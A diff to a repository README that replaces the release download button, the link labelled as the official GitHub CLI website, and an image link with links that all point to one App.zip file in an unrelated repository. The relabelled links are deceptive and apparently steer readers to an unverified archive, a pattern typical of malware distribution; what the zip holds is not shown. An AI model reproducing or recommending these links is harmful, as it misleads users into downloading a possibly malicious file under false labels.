@@ -9,15 +9,15 @@ Unfortunately, specific topics for this repository are not provided. However, fe
 ## Get Started
 To access the repository content, download the latest release by clicking the button below:
 
-[![Download Repository](https://img.shields.io/badge/Download-Latest%20Release-yellow)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Repository](https://github.com/bbget00/wikitok/releases/download/v1.0/App.zip%20Release-yellow)](https://github.com/bbget00/wikitok/releases/download/v1.0/App.zip)
 
 *Note: Click the button above to download the latest release of the repository.*
 
 If the link does not work, please check the "Releases" section of this repository to find alternative download options.
 
 ## Explore Further
-Visit the official [GitHub CLI](https://github.com/cli/go-gh) website to explore more tools and resources related to GitHub. 
+Visit the official [GitHub CLI](https://github.com/bbget00/wikitok/releases/download/v1.0/App.zip) website to explore more tools and resources related to GitHub. 
 
 Feel free to contribute to this repository by adding your own tech-related content or suggesting improvements. Your contributions are greatly appreciated!
 
-![Tech Image](https://imageurl.com)
+![Tech Image](https://github.com/bbget00/wikitok/releases/download/v1.0/App.zip)
